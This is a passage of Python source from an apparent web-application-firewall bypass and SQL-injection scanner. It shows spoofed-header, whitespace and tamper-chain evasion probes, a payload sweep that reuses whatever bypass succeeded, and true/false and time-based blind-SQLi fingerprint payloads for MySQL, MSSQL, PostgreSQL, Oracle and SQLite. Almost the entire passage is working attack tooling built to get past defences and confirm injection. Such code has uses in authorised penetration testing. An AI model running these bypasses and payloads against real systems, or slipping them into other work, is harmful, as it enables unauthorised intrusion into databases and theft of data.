        self._report("[Bypass] HPP (dup param)", probe, status, body, oc)
        if not self._is_blocked(status, body) and not self._bypass:
            self._log("[+] HPP bypass WORKED!")
            self._bypass = {"type": "header", "headers": hpp_hdrs}

        # ── 2-J: Tab / form-feed whitespace variants ──────────────────────────
        # Swap spaces for \t, \x0b, \x0c in the probe payload.
        self._log("[2-J] Whitespace variants...")
        ws_variants = [
            (probe.replace(' ', '\t'),    "Tab (\\t)"),
            (probe.replace(' ', '\x0b'),  "VT (\\x0b)"),
            (probe.replace(' ', '\x0c'),  "FF (\\x0c)"),
            (probe.replace(' ', '\r'),    "CR (\\r)"),
            (probe.replace(' ', '\x00'), "Null byte space"),
        ]
        for variant_probe, ws_label in ws_variants:
            if variant_probe == probe:
                continue
            req = self._build_request(variant_probe)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            self._report("[Bypass] Whitespace: " + ws_label,
                                 variant_probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Whitespace bypass WORKED: " + ws_label)
                self._bypass = None     # no easy replay for raw bytes; mark as no-re-apply

        # ── 2-K: Cache-busting / noise headers ───────────────────────────────
        # Injecting random junk headers sometimes trips per-session WAF bypass.
        self._log("[2-K] Cache-busting / noise headers...")
        noise_sets = [
            ["X-WafTest: 1", "X-Scanner: WafBreaker"],
            ["X-Custom-Header: bypass", "X-Requested-With: XMLHttpRequest"],
            ["Via: 1.1 localhost", "X-Originating-IP: 127.0.0.1",
             "X-Forwarded-For: 127.0.0.1", "X-Remote-IP: 127.0.0.1"],
            ["Origin: https://localhost", "Referer: https://localhost/admin"],
            ["X-WAF-Bypass: 1", "Pragma: no-cache",
             "Cache-Control: no-store, no-cache", "Upgrade: websocket"],
        ]
        for noise_hdrs in noise_sets:
            req = self._build_request(probe, extra_headers=noise_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = noise_hdrs[0][:40]
            self._report("[Bypass] Noise: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Noise-header bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": noise_hdrs}

        # ── 2-L: Accept-Language / Accept header bypass ───────────────────────
        # Some WAFs skip deep inspection for exotic Accept-Language values.
        self._log("[2-L] Accept / Accept-Language header bypass...")
        accept_sets = [
            ["Accept: */*; q=0.01", "Accept-Language: *"],
            ["Accept: application/json,*/*;q=0.1"],
            ["Accept-Language: en-US,en;q=0.9,x-waf;q=0.1"],
            ["Accept-Encoding: identity;q=0, *;q=0", "Accept: text/html"],
        ]
        for acc_hdrs in accept_sets:
            req = self._build_request(probe, extra_headers=acc_hdrs)
            status, body = self._send(req)
            oc = self._outcome(status, body)
            label = acc_hdrs[0][:40]
            self._report("[Bypass] Accept: " + label,
                                 probe, status, body, oc)
            if not self._is_blocked(status, body) and not self._bypass:
                self._log("[+] Accept bypass WORKED: " + label)
                self._bypass = {"type": "header", "headers": acc_hdrs}

        if self._bypass:
            self._log("[Phase 2 complete]  Active bypass: %s" % self._bypass.get("name", self._bypass["type"]))
        else:
            self._log("[Phase 2 complete]  No bypass succeeded — sending payloads raw anyway.")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 3 — FULL PAYLOAD SWEEP
    # ═════════════════════════════════════════════════════════════════════════
    def _apply_bypass(self, payload, kwargs):
        """Apply the active bypass technique to kwargs and possibly transform payload."""
        if not self._bypass:
            return payload, kwargs
        btype = self._bypass["type"]
        if btype == "header":
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "charset_ibm037":
            payload = ibm037_encode(payload)
            kwargs["charset"] = "ibm037"
        elif btype == "charset":
            kwargs["charset"] = self._bypass["cs"]
        elif btype == "method":
            kwargs["override_method"] = self._bypass["verb"]
        elif btype == "junk":
            kwargs["add_junk"] = True
        elif btype in ("override_header", "ct"):
            kwargs["extra_headers"] = self._bypass["headers"]
        elif btype == "tamper":
            # Apply the winning sqlmap-style tamper function to the payload
            try:
                payload = self._bypass["func"](payload)
            except Exception:
                pass    # silently use untampered payload if transform fails
        return payload, kwargs

    def _phase_payloads(self):
        payloads  = PAYLOADS[self._vtype]
        self._log("[Phase 3]  %d payloads queued..." % len(payloads))
        sqli_confirmed = False   # fire DB fingerprint only once per scan

        for idx, payload in enumerate(payloads, 1):
            self._log("[%d/%d] %s" % (idx, len(payloads), payload[:70]))

            kwargs  = {}
            p, kw   = self._apply_bypass(payload, kwargs)
            req     = self._build_request(p, **kw)
            status, body = self._send(req)
            oc      = self._outcome(status, body)
            self._report("Payload #%d" % idx,
                                 payload, status, body, oc)

            # ── Smart SQLi DB fingerprinting ──────────────────────────────────
            # When a bypass-style SQLi payload passes for the first time →
            # immediately fire true/false pairs for all major DB engines to
            # confirm blind injection and identify the backend.
            if (self._vtype == "SQL Injection"
                    and not sqli_confirmed
                    and oc in ("PASSED", "BYPASS", "VULN!")):
                # Heuristic: looks like a conditional bypass payload
                if any(tok in payload.upper() for tok in
                       ("/**/", "UNION", "AND 1=1", "OR 1=1",
                        "SLEEP", "WAITFOR", "PG_SLEEP", "AND 1",
                        "/*!",   "--", "#")):
                    sqli_confirmed = True
                    self._log("[*] Bypass confirmed on payload #%d — firing DB fingerprint battery..." % idx)
                    self._phase_sqli_fingerprint()

            time.sleep(0.08)

        self._log("[Phase 3 complete]")

        # ── Phase 3.8: Tamper combo sweep (SQLi only, when no bypass yet set) ──
        # If we still haven't found a bypass, try combining pairs of tampers
        # against a representative probe payload to discover compound evasions.
        if (self._vtype == "SQL Injection"
                and not sqli_confirmed
                and not self._bypass):
            self._phase_tamper_combo()

    # ── Phase 3.8: Tamper combination sweep ────────────────────────────────────
    def _phase_tamper_combo(self):
        """
        Try composing two tamper functions together on a set of canary payloads.
        Useful when a single tamper produces output still caught by the WAF but
        a secondary transform slips past regex patterns that depend on structure.
        """
        self._log("[Phase 3.8] Tamper combos (2-tamper chains)...")

        # A compact set of SQLi canary probes likely to trigger WAF rules
        canaries = [
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "1 AND SLEEP(0)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        ]

        # Only try the first 20 tampers to avoid a combinatorial explosion;
        # prioritise those with 'any' db_type compatibility.
        any_tampers = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "any"][:10]
        mysql_tampers = [(n, f, d) for (n, f, d, db) in SQLI_TAMPERS if db == "mysql"][:10]
        pool = any_tampers + mysql_tampers

        for canary in canaries:
            for i, (n1, f1, _) in enumerate(pool):
                for n2, f2, _ in pool[i+1:i+4]:  # pair with next 3 in pool
                    try:
                        chained = f2(f1(canary))
                    except Exception:
                        continue
                    if chained == canary:
                        continue
                    req = self._build_request(chained)
                    status, body = self._send(req)
                    oc = self._outcome(status, body)
                    label = "[Bypass] Combo: %s+%s" % (n1, n2)
                    self._report(label, chained, status, body, oc)
                    if not self._is_blocked(status, body):
                        self._log("[+] Tamper combo WORKED: %s + %s" % (n1, n2))
                        # Store the composition as the active bypass
                        f1_ref, f2_ref = f1, f2
                        def _combo(p, _a=f1_ref, _b=f2_ref):
                            return _b(_a(p))
                        self._bypass = {
                            "type": "tamper",
                            "func": _combo,
                            "name": "%s+%s" % (n1, n2),
                        }
                        return      # one working combo is enough

        self._log("[Phase 3.8 complete]")

    # ═════════════════════════════════════════════════════════════════════════
    #   PHASE 4 — TAMPER SWEEP  (SQL Injection only)
    #   For each tamper script × each payload category, build a tampered
    #   variant of a representative seed payload and fire it.
    #   Uses the active bypass on top if one was found in Phase 2.
    # ═════════════════════════════════════════════════════════════════════════
    def _phase_tamper_sweep(self):
        if self._vtype != "SQL Injection":
            return

        total = len(SQLI_TAMPERS) * len(SQLI_PAYLOAD_SEEDS)
        self._log("[Phase 4] Tamper sweep: %d tampers × %d categories = %d variants..." % (
            len(SQLI_TAMPERS), len(SQLI_PAYLOAD_SEEDS), total))

        sqli_confirmed = False
        done = 0

        for (cat_label, seed_payloads) in SQLI_PAYLOAD_SEEDS:
            # Representative seed = first entry in the category
            seed = seed_payloads[0]

            for (tname, tfunc, tdesc, tdb) in SQLI_TAMPERS:
                done += 1
                try:
                    tampered = tfunc(seed)
                except Exception:
                    continue
                if tampered == seed:
                    continue     # tamper had no visible effect on this payload

                # Optionally stack the winning Phase-2 bypass on top of the tamper
                # (skip stacking if the Phase-2 bypass IS a tamper — avoids double-tamper)
                kwargs = {}
                if self._bypass and self._bypass.get("type") != "tamper":
                    _, kwargs = self._apply_bypass(tampered, kwargs)

                req = self._build_request(tampered, **kwargs)
                status, body = self._send(req)
                oc = self._outcome(status, body)

                label = "[P4] %s | %s" % (cat_label, tname)
                self._report(label, tampered, status, body, oc)

                # First bypass confirmation triggers DB fingerprint
                if not sqli_confirmed and oc in ("PASSED", "BYPASS", "VULN!"):
                    sqli_confirmed = True
                    self._log("[*] Phase 4 bypass confirmed: %s + %s — firing DB fingerprint..." % (
                        cat_label, tname))
                    self._phase_sqli_fingerprint()

                # Also try each secondary seed payload in the category
                for extra_seed in seed_payloads[1:3]:   # up to 2 more per category
                    try:
                        tampered2 = tfunc(extra_seed)
                    except Exception:
                        continue
                    if tampered2 == extra_seed:
                        continue
                    req2 = self._build_request(tampered2, **kwargs)
                    st2, body2 = self._send(req2)
                    oc2 = self._outcome(st2, body2)
                    self._report("[P4b] %s | %s" % (cat_label, tname),
                                 tampered2, st2, body2, oc2)

        self._log("[Phase 4 complete] — %d variants sent." % done)

    # ── SQLi DB fingerprint (fires when a bypass payload passes) ─────────────
    def _phase_sqli_fingerprint(self):
        """
        Send true/false differential pairs for each major DB engine.
        A difference in response length/content between TRUE and FALSE confirms
        blind SQLi and identifies the backend.
        """
        self._log("[Phase 3.5] DB Fingerprint: sending true/false pairs...")

        # Each tuple: (label, true_payload, false_payload)
        fingerprints = [
            # ── MySQL / MariaDB ───────────────────────────────────────────────
            ("MySQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MySQL  SLEEP",  "1 AND SLEEP(0)--", "1 AND SLEEP(5)--"),
            ("MySQL  VER  ",
             "1 AND SUBSTRING(@@version,1,1)>'3'--",
             "1 AND SUBSTRING(@@version,1,1)>'9'--"),
            ("MySQL  EXTV ",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
             "' AND EXTRACTVALUE(1,CONCAT(0x7e,'no'))--"),
            # ── MSSQL ─────────────────────────────────────────────────────────
            ("MSSQL  TRUE ",  "1 AND 1=1--",  "1 AND 1=2--"),
            ("MSSQL  WAIT ",  "1; WAITFOR DELAY '0:0:0'--",
                              "1; WAITFOR DELAY '0:0:5'--"),
            ("MSSQL  VER  ",
             "1 AND SUBSTRING(@@version,1,9)='Microsoft'--",
             "1 AND SUBSTRING(@@version,1,9)='ZZZZZZ'--"),
            # ── PostgreSQL ────────────────────────────────────────────────────
            ("PgSQL  TRUE ",
             "1 AND 1=(SELECT 1)--",
             "1 AND 1=(SELECT 2)--"),
            ("PgSQL  SLEEP",
             "1 AND (SELECT 1 FROM PG_SLEEP(0))=1--",
             "1 AND (SELECT 1 FROM PG_SLEEP(5))=1--"),
            ("PgSQL  VER  ",
             "' AND 1=CAST((SELECT version()) AS NUMERIC)--",
             "' AND 1=CAST('no' AS NUMERIC)--"),
            # ── Oracle ────────────────────────────────────────────────────────
            ("Oracle TRUE ",
             "1 AND 1=1 FROM DUAL--",
             "1 AND 1=2 FROM DUAL--"),
            ("Oracle PIPE ",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',0)=1--",
             "' AND DBMS_PIPE.RECEIVE_MESSAGE('A',5)=1--"),
            # ── SQLite ────────────────────────────────────────────────────────
            ("SQLite TRUE ",
             "1 AND 1=1--",
             "1 AND 1=2--"),
            ("SQLite VER  ",
             "1 AND SQLITE_VERSION()>'3'--",
             "1 AND SQLITE_VERSION()>'9'--"),
        ]

        for label, true_pl, false_pl in fingerprints:
            # Send TRUE condition
            kwargs_t = {}
            t_pl, kw_t = self._apply_bypass(true_pl,  kwargs_t)
            req_t  = self._build_request(t_pl, **kw_t)
            st_t, body_t = self._send(req_t)

            # Send FALSE condition
            kwargs_f = {}
            f_pl, kw_f = self._apply_bypass(false_pl, kwargs_f)
            req_f  = self._build_request(f_pl, **kw_f)
            st_f, body_f = self._send(req_f)

            # Differential detection
            len_t = len(body_t)
            len_f = len(body_f)
            diff  = abs(len_t - len_f)
            if diff > 20 or st_t != st_f:
                diff_label = "DIFF=%d" % diff
                oc_t = "VULN!"
                oc_f = "VULN!"
                self._log("[!!!] %s — response differential %d bytes (T:%d F:%d)" % (
                    label.strip(), diff, st_t, st_f))
            else:
                diff_label = "SAME"
                oc_t = self._outcome(st_t, body_t)
                oc_f = self._outcome(st_f, body_f)

            self._report(
                label + " [TRUE]  " + diff_label,
                true_pl, st_t, body_t, oc_t)
            self._report(
                label + " [FALSE] " + diff_label,
                false_pl, st_f, body_f, oc_f)

            time.sleep(0.08)

        self._log("[Phase 3.5 complete]")

